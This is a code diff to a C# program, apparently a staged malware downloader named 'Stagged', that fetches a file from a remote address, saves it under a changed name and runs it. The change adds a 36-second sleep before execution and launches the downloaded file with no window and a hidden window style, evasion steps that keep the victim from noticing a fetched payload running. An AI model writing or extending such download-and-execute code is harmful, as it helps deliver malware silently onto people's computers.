@@ -2,10 +2,12 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Net.Http;
 using System.Net;
 using System.IO;
+using System.Diagnostics;
 
 namespace Stagged
 {
@@ -33,11 +35,20 @@ namespace Stagged
             myStringWebResource = remoteUri + file_name;
             myWebClient.DownloadFile(myStringWebResource, download_path + "\\" + name_changed);
 
-            //Remplis le tableau payload des octets du fichier télécharger
-            //byte[] payload = File.ReadAllBytes(download_path + "\\" + name_changed); 
-            System.Diagnostics.Process.Start(download_path + "\\" + name_changed);
+            
+            Thread.Sleep(36000);
 
-                        
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.CreateNoWindow = true;
+            startInfo.UseShellExecute = false;
+            startInfo.FileName = (download_path + "\\" + name_changed);
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
+      
+
+            Process process = Process.Start(startInfo);
+
+
 
         }
     }
